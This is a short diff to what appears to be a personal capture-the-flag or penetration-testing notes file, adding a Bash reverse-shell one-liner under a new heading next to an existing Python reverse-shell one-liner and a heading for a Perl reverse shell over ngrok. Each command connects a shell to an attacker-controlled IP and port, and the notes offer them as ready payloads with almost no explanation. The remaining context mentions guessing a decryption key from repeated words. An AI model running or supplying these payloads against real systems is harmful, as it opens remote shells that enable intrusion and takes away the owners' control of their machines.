@@ -19,7 +19,10 @@ ahahahhahaha. Ahhh Face it... he's just odd.
 
 Too many Face words are in here so, that word becomes the key/password to decrypt
 __________________________________________________________________________________________________________________________
+Bash Reverse shell
 
+bash -c 'bash -i >& /dev/tcp/10.10.14.167/2222 0>&1'
+__________________________________________________________________________________________________________________________
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.52.17",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 
 perl reverse shell payload (with ngrok port forwarding)
